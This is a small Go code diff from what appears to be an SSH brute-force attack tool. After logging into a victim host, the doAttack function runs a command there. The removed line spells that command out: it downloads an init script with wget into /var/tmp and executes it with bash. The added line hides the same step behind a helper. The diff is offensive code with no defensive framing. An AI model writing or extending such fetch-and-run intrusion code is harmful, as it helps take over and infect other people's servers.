@@ -63,9 +63,9 @@ func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient, ip string, po
 
 	var ap *attack.AttackProcess
 
-	initUrl := sba.attackTasks.DownloadInitUrl(ip, port, SSHBruteForceAttackType, "init.sh.tpl")
+	initUrl := sba.attackTasks.DownloadInitUrl(ip, port, SSHBruteForceAttackType, "init.sh")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
+	cmd := sba.attackTasks.InitCmdForLinux(initUrl)
 
 	result, err := sshClient.RunCmd(cmd)
 
